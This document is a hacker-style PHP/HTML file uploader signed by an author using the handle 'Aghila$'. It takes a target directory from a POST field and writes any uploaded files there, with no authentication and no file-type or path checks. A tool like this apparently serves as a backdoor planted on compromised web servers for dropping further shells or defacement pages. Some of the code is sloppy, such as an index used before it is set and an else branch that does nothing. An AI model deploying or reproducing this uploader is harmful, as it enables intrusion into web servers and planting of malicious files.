<html>
<head>
<meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<p align="center">
<img border="0" src="http://www.icone-gif.com/gif/drapeaux/algerie/3Argelia-Algerie.gif"</p>
<link href="http://www.icone-gif.com/gif/drapeaux/algerie/3Argelia-algeria_mw.gif" type="image/x-icon" rel="shortcut icon" />
<title>UpL0aD3r / C0d3d By Agh!La$</title>
<style type="text/css">
body,table { font-family:verdana;font-size:11px;color:white;background-color:black; }
table { width:100%; }


a { color:lightblue;text-decoration:none; }
a:active { color:#00FF00; }
a:link { color:#5B5BFF; }
a:hover { text-decoration:underline; }
a:visited { color:#99CCFF; }
input,select,option { font:8pt tahoma;color:#FFFFFF;margin:2;border:1px solid #666666; }
textarea { color:#dedbde;font:fixedsys bold;border:1px solid #666666;margin:2; }
.fleft { float:left;text-align:left; }
.fright { float:right;text-align:right; }
#pagebar { font:10pt tahoma;padding:5px; border:3px solid #1E1E1E; border-collapse:collapse; }
#pagebar td { vertical-align:top; }
#pagebar p { font:8pt tahoma;}
#pagebar a { font-weight:bold;color:#00FF00; }
#pagebar a:visited { color:#00CE00; }
#mainmenu { text-align:center; }
#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
#maininfo,.barheader,.barheader2 { text-align:center; }
#maininfo td { padding:3px; }
.barheader { font-weight:bold;padding:5px; }
.barheader2 { padding:5px;border:2px solid #1F1F1F; }
.contents,.explorer { border-collapse:collapse;}
.contents td { vertical-align:top; }
.mainpanel { border-collapse:collapse;padding:5px; }
.barheader,.mainpanel table,td { border:1px solid #333333; }
.mainpanel input,select,option { border:1px solid #333333;margin:0; }
input[type="submit"] { border:1px solid #000000; }
input[type="text"] { padding:3px;}
.shell { background-color:#C0C0C0;color:#000080;padding:5px; }
.fxerrmsg { color:red; font-weight:bold; }
#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
#pagebar,.mainpanel,input[type="submit"] { background-color:#4A4A4A; }
.barheader2,input,select,option,input[type="submit"]:hover { background-color:#333333; }
textarea,.mainpanel input,select,option { background-color:red; }
// -->
</style>
</head>


<?php

if($_POST['UploadNow'])
{
	$uploadingDir = $_POST['uploadingDir'];
	$uploadingDir = str_replace("\\\\","\\",$uploadingDir);
	$uploadingDir = str_replace("//","/",$uploadingDir);
	chdir($uploadingDir);
	$nbr_uploaded =0;
	$files_uploded = array();
	$path= '';
	$target_path= $path . basename($_FILES['uploadfile']['name'][$i]);
	for ($i = 0; $i < count($_FILES['uploadfile']['name']); $i++)
	{
		if($_FILES['uploadfile']['name'][$i] != '')
		{
			move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $target_path . $_FILES['uploadfile']['name'][$i]);
			$files_uploded[] = $_FILES['uploadfile']['name'][$i];
			$nbr_uploaded++;
			echo "The File  ".basename($_FILES['uploadfile']['name'][$i])." Uploaded Successfully :)
";
		}
		else "The File  ".basename($_FILES['uploadfile']['name'][$i])."  Can't Be Upload :( !";
	}
} 
?><head>
<title>~[ CoD3D By Aghila$ ]~</title></head>
<p align="center"><font face="Arial" color="red"><b>Upload Your File's</b></font><p align="center"><b><font face="Arial">DC0D3D By :
</font></b><font face="Tahoma"><strong>

AghilaS</strong></font></p>
<center>
<form action="" method="post" enctype="multipart/form-data" name="uploader" >
<!-- gO :D -->
<form enctype="multipart/form-data" method="POST"><table width='100%' height='72' border='0' ><tr>
<font face="Arial" color="blue"><center>GO :D</center>
<center><input type='file' name='uploadfile[]'><input type='file' name='uploadfile[]'><br />
<input type='file' name='uploadfile[]'><input type='file' name='uploadfile[]'><br />
<input type='file' name='uploadfile[]'><input type='file' name='uploadfile[]'><br /></center>
<div id='uploadInput'></div>
<br/><br/><br/>
<input type='hidden' name='uploadingDir' value=''/>
<center><input type='submit' value='Upload Files' name='UploadNow'></center>
</td></tr></table></form>